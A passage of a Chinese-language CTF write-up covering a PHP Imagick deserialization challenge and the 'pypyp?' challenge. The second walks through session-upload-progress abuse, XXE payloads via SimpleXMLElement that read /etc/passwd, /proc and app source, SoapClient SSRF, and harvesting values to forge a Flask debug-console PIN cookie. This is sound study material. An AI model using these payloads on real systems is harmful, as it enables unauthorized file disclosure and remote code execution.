class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>write_file(xml)<br>time.sleep(<span class="hljs-number">3</span>)<br><br>write_file(xml2)<br>time.sleep(<span class="hljs-number">3</span>)<br><br>session_start(session_id)<br></code></pre></td></tr></table></figure><p>这个脚本一共有五个功能，分别是写文件（xml），删除文件（即cmd&#x3D;rm），获取一个新的session（session_start），session_start（即触发_sleep的最后一步），展示phpinfo界面。</p><p>按照脚本的步骤来，第一步是清除临时文件，然后生成一个新的session</p><p>此时反序列化数据如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;fumo_backdoor&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;path&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;argv&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;vid:msl:/tmp/a&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;session_start&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;class&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Imagick&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>然后输出获得的session</p><p>再次清除临时文件</p><p>开始写入xml文档，第一次写入的文档内容如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">image</span> &gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">read</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;mvg:/flag[20x20+20+20]&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">write</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;mvg:/tmp/yyz&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span><br></code></pre></td></tr></table></figure><p>反序列化内容如下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">O:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;fumo_backdoor&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;path&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;argv&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;vid:msl:/tmp/php*&quot;</span>;&#125;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;N;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;class&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Imagick&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>第二次写入内容如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">image</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">read</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;inline:data:text/8BIM;base64,eXl6fE86MTM6ImZ1bW9fYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czo4OiIvdG1wL3l5eiI7czo0OiJmdW5jIjtzOjEzOiJzZXNzaW9uX3N0YXJ0Ijt9&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">write</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;8BIM:/tmp/sess_&#123;session_id&#125;&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span><br></code></pre></td></tr></table></figure><p>反序列化内容如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">yyz</span>|O:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;fumo_backdoor&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;path&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;/tmp/yyz&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;session_start&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>最后是带出flag，反序列化内容如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;fumo_backdoor&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;path&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;/tmp/yyz&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;session_start&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>可能是手工构造存在什么小细节不好把握吧，太难搞了，以后有这种题目还是尽量通过脚本来接提拔。。。太难受了，这题总共做了三天差不多😭😭😭</p><h3 id="pypyp？"><a href="#pypyp？" class="headerlink" title="pypyp？"></a>pypyp？</h3><p>又是很坑爹的一题😭😭😭，前前后后一共做了四天差不多。不过也学到了许多知识</p><p>一进入页面提示session not started，题目提示&#x2F;app&#x2F;app.py，访问看看</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307230218997.png" alt="image-20230713002110951"></p><p>似乎不能直接利用。。。到这里就没啥思路了</p><p>最后上网查了一下WP才知道这里的考点是PHP的<code>session_upload_progress</code>强制生成session，因为题目提示里有个app.py,我就以为网站都是用python编写的。这里是我思维局限了，没去Wappalyzer看一下这个网站用的是什么语言。其实在这个session页面用的是PHP编写。</p><p><code>session_upload_progress</code>是个老考点了，不过太久没做题我就把这个知识点给忘了😓</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307230218992.png" alt="image-20230713001809914"></p><p>因为直接发送请求包并不会在服务器上创建会话，所以在这里利用<code>session_upload_progress</code>的特点来从服务器上强制创建一个session，使用如下脚本来构造一个上传文件与请求进度同时存在的文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!doctype <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://115.239.215.75:8081/index.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里要抓包在请求包中添加<code>Cookie: PHPSESSID</code>才可以</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307230218663.png" alt="image-20230713162129739"></p><p>过去之后获得源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Session not started&#x27;</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$type</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;type&#x27;</span>];<br>    <span class="hljs-variable">$properties</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;properties&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$properties</span>)&amp;&amp;<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$properties</span>)))&#123;<br>    <span class="hljs-variable">$object</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$properties</span>));<br>    <span class="hljs-variable">$object</span> -&gt; <span class="hljs-title function_ invoke__">sctf</span>();<br>    <span class="hljs-keyword">exit</span>();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$properties</span>))&#123;<br>        <span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$type</span>(<span class="hljs-variable">$properties</span>[<span class="hljs-number">0</span>],<span class="hljs-variable">$properties</span>[<span class="hljs-number">1</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$object</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;http://127.0.0.1:5000/&#x27;</span>.<span class="hljs-variable">$properties</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is the object: <span class="hljs-subst">$object</span> &lt;br&gt;&quot;</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看起来有点复杂，一行一行看下去</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Session not started&#x27;</span>);<br>    &#125;<br><span class="hljs-comment">//判断是否有session，若无则直接退出</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$type</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;type&#x27;</span>];<br>    <span class="hljs-variable">$properties</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;properties&#x27;</span>];<br><span class="hljs-comment">//在session读取两个属性的值并赋值</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br><span class="hljs-comment">//可控数据data</span><br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]));<br><span class="hljs-comment">//对data进行反序列化。extract，可以将数组中的键值对转换为变量和对应的值，可以利用此函数进行变量覆盖</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$properties</span>)&amp;&amp;<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$properties</span>)))&#123;<br><span class="hljs-comment">//判断，若properties为字符串且能反序列化，则进入如下判断</span><br>    <span class="hljs-variable">$object</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$properties</span>));<br><span class="hljs-comment">//将object设置为properties的反序列化对象</span><br>    <span class="hljs-variable">$object</span> -&gt; <span class="hljs-title function_ invoke__">sctf</span>();<br><span class="hljs-comment">//调用sctf()方法</span><br>    <span class="hljs-keyword">exit</span>();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$properties</span>))&#123;<br>        <span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$type</span>(<span class="hljs-variable">$properties</span>[<span class="hljs-number">0</span>],<span class="hljs-variable">$properties</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-comment">//若properties方法是数组，则把type当做类名，properties的前两个值当做参数实例化一个类</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$object</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;http://127.0.0.1:5000/&#x27;</span>.<span class="hljs-variable">$properties</span>);<br><span class="hljs-comment">//通过内网读取文件，其中文件由properties的值决定</span><br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is the object: <span class="hljs-subst">$object</span> &lt;br&gt;&quot;</span>;<br><span class="hljs-comment">//最后会由echo输出object内容</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>一开始看这里我的想法是可能需要控制cookie中的type和properties中的值，或者是不是可以构造一个SCTF方法，在反序列化的时候进行应用。但是很快发现这样行不通，不过type和properties的值可以通过extract函数控制，这样的话我们就可以控制if的条件判断。</p><p>然后就是data的反序列化，这里又有个问题，就是在这段源码里是没有魔术方法的，所以不是按照正常的反序列化的路来走，而是要利用原生类进行反序列化。（又是新的知识点）</p><p>这里利用的是SimpleXMLElement进行反序列化，可以实现远程xml文件的载入。</p><p>所以要利用这个点来读文件先看看</p><p>反序列化的点在if的第二个分支上，先读一个app.py</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$class</span>=<span class="hljs-string">&#x27;SimpleXMLElement&#x27;</span>;<br><span class="hljs-variable">$xml</span>=<span class="hljs-string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;/xxe&gt;&#x27;</span>;<br><span class="hljs-variable">$arr</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;properties&#x27;</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;$xml&#x27;</span>),<span class="hljs-string">&#x27;type&#x27;</span>=<span class="hljs-variable">$class</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>);<br><span class="hljs-comment">#a:2:&#123;s:10:&quot;properties&quot;;a:2:&#123;i:0;s:98:&quot;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &quot;file:///app/app.py&quot;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;/xxe&gt;&quot;;i:1;s:1:&quot;2&quot;;&#125;s:4:&quot;type&quot;;s:16:&quot;SimpleXMLElement&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>源码如下，debug&#x3D;True，可以尝试进入控制台查看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask <br><br>app = Flask(__name__) <br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(): <br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello World!&#x27;</span> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>: <br>app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>,debug=<span class="hljs-literal">True</span>) <br></code></pre></td></tr></table></figure><p>访问console看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$arr</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;properties&#x27;</span>=&gt;<span class="hljs-string">&#x27;console&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>);<br><span class="hljs-comment">#a:1:&#123;s:10:&quot;properties&quot;;s:7:&quot;console&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/shark-rice/images/raw/master/202307230218014.png" alt="image-20230713232847848"></p><p>这里还有一个之前的功能点没利用到，就是SCTF()，我之前的想法是构造一个然后在反序列化的时候执行，但是仔细一想就知道行不通。</p><p>这里的正确做法依然是利用PHP原生类反序列化，利用的是SoapClient类。</p><blockquote><p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p></blockquote><p>SoapClient类内部有一个__call()魔术方法，利用访问sctf()这个不存在的方法可触发该魔术方法</p><blockquote><p>当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。</p><p>该类的构造函数如下：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">&gt;<span class="hljs-keyword">public</span> SoapClient <span class="hljs-type">:: SoapClient</span>(mixed $wsdl <span class="hljs-meta">[</span>，<span class="hljs-built_in">array</span> $options <span class="hljs-meta">]</span>)<br></code></pre></td></tr></table></figure><ul><li>第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</li></ul></blockquote><ul><li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</li></ul><p>这里的做法是利用SoapClient类进行SSRF+CRLF利用组合拳。</p><p>在本地搭建flask调试，输入pin码可以看到如下参数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">GET</span> /console?<span class="hljs-attribute">__debugger__</span>=<span class="hljs-literal">yes</span>&amp;cmd=pinauth&amp;pin=310-566-904&amp;s=m2gd46SPCKq3xBvkONlJ<br></code></pre></td></tr></table></figure><ul><li>__debugger__：调试模式的是否开启</li><li>cmd：输入的命令</li><li>pin：即pin码</li><li>s：代表secret</li></ul><p>我们进入控制台后会返回一个cookie</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">__wzd148551f810a0da4e55b5</span>=<span class="hljs-number">1689267106</span>|d9bcbb95c7f2<br></code></pre></td></tr></table></figure><p>cookie格式如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Cookie: <span class="hljs-attribute">cookieName</span>=时间戳|hash签名<br></code></pre></td></tr></table></figure><p>进入控制台后输入命令可以看到有如下参数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">GET</span> /console?&amp;<span class="hljs-attribute">__debugger__</span>=<span class="hljs-literal">yes</span>&amp;cmd=whoami&amp;frm=0&amp;s=m2gd46SPCKq3xBvkONlJ<br></code></pre></td></tr></table></figure><p>这里的思路是伪造cookie然后命令执行反弹shell</p><p>其中secret我们可以通过访问&#x2F;console获得。</p><p>cookie伪造&amp;pin码爆破脚本：<a href="https://github.com/WiIs0n/Flask-cookie-generation-based-on-PIN-code">https://github.com/WiIs0n/Flask-cookie-generation-based-on-PIN-code</a></p><p>需要提供的参数有<code>username</code>、<code>modname</code>、<code>appname</code>、<code>basefile</code>、<code>uuid</code>、<code>machineid</code>。</p><p>获得方式如下</p><ul><li>username：查看&#x2F;etc&#x2F;passwd 一般是app</li><li>modename: 默认flask.app</li><li>uuid：&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address 16进制转10进制</li><li>machineid：machine_id由三个合并(docker环境就只需后两个)：1.&#x2F;etc&#x2F;machine-id 2.&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id 3.&#x2F;proc&#x2F;self&#x2F;cgroup</li><li>basefile：&#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;flask&#x2F;app.py （默认路径）</li></ul><blockquote><p>伪造以前首先需要知道python的版本，我们查询一下是否存在 python3.8路径的<code>LICENSE.txt</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&gt;<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python3.8/</span>LICENSE.txt<br></code></pre></td></tr></table></figure></blockquote><p>以上文件皆使用XXE来读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$class</span>=<span class="hljs-string">&#x27;SimpleXMLElement&#x27;</span>;<br><span class="hljs-variable">$xml</span>=<span class="hljs-string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &quot;文件路径&quot;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;/xxe&gt;&#x27;</span>;<br><span class="hljs-variable">$arr</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;properties&#x27;</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-variable">$xml</span>,<span class="hljs-string">&#x27;2&#x27;</span>),<span class="hljs-string">&#x27;type&#x27;</span>=&gt;<span class="hljs-variable">$class</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>);<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml">a:2:&#123;s:10:&quot;properties&quot;;a:2:&#123;i:0;s:98:&quot;<span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span>  <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">xxe</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xxe</span>&gt;</span>&quot;;i:1;s:1:&quot;2&quot;;&#125;s:4:&quot;type&quot;;s:16:&quot;SimpleXMLElement&quot;;&#125;<br><br>02:42:ac:13:00:02 =&gt;2661721902<br> <br>a:2:&#123;s:10:&quot;properties&quot;;a:2:&#123;i:0;s:118:&quot;<span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span>  <span class="hljs-string">&quot;file:///proc/sys/kernel/random/boot_id&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">xxe</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xxe</span>&gt;</span>&quot;;i:1;s:1:&quot;2&quot;;&#125;s:4:&quot;type&quot;;s:16:&quot;SimpleXMLElement&quot;;&#125;<br><br>349b3354-f67f-4438-b395-4fbc01171fdd<br><br>a:2:&#123;s:10:&quot;properties&quot;;a:2:&#123;i:0;s:104:&quot;<span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span>  <span class="hljs-string">&quot;file:///proc/self/cgroup&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">xxe</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xxe</span>&gt;</span>&quot;;i:1;s:1:&quot;2&quot;;&#125;s:4:&quot;type&quot;;s:16:&quot;SimpleXMLElement&quot;;&#125;<br><br>96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687 <br></code></pre></td></tr></table></figure><p>获得了这些数据之后可以开始伪造cookie</p><figure class="highlight maxima"><table><tr><td 